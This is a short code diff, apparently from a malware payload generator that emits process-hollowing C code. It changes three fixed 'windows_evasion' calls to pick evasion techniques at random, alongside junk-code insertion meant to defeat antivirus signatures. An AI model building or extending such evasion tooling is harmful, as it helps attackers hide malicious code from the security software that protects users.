@@ -88,10 +88,9 @@ Junkcode5 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
 Junkcode6 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
 Junkcode7 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
 
-Win_eva1 = usefull.windows_evasion("4")
-Win_eva2 = usefull.windows_evasion("1")
-Win_eva3 = usefull.windows_evasion("2")
-
+Win_eva1 = usefull.windows_evasion(str(random.randint(1,4)))
+Win_eva2 = usefull.windows_evasion(str(random.randint(1,4)))
+Win_eva3 = usefull.windows_evasion(str(random.randint(1,4)))
 
 Hollow_code = ""
 Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
